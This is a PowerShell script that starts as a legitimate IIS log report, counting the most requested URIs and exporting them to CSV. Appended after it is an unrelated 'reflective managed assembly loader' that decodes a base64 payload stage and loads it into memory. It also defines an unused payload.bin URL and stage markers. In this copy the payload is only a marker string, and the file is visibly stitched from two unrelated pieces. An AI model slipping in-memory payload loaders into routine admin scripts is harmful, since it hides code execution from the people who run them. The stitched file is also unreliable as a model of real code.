$ErrorActionPreference = "Stop"
$LogRoot    = 'D:\Logs\iis\W3SVC7'
$Days       = 30
$TopN       = 20
$OutputPath = 'D:\Ops\reports\iis-top-2026-11-01.csv'
$HtmlPath   = "D:\Ops\reports\iis-2026-11-01.html"


$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$TargetUrl = "https://localhost:8000/payload.bin"
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpkOHdyY210Ynhn")
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 18 reached"
$StageMarker = "stage-23"
